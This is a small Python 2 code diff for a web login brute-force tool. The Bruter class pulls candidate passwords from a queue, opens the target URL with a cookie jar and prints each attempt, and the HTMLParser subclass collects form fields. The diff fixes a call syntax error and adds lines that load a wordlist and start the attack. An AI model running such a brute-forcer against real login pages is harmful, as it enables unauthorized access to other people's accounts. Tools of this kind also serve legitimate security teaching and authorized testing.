@@ -42,7 +42,7 @@ class Bruter(object):
 			brute = self.password_q.get().rstrip()
 			jar = cookielib.FileCookieJar("cookies")
 			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
-			response = opener.open target_url
+			response = opener.open(target_url)
 			page = response.read()
 			print "[+] Trying: %s %s (%d left)" %(self.username,brute,self.password_q.qsize())
 
@@ -87,3 +87,7 @@ class BruteParser(HTMLParser):
 
 			if tag_name is not None:
 				self.tags_results[tag_name] = value
+
+words = build_wordlist(wordlist_file)
+brute_obj = Bruter(username,words)
+brute_obj.run_bruteforce()
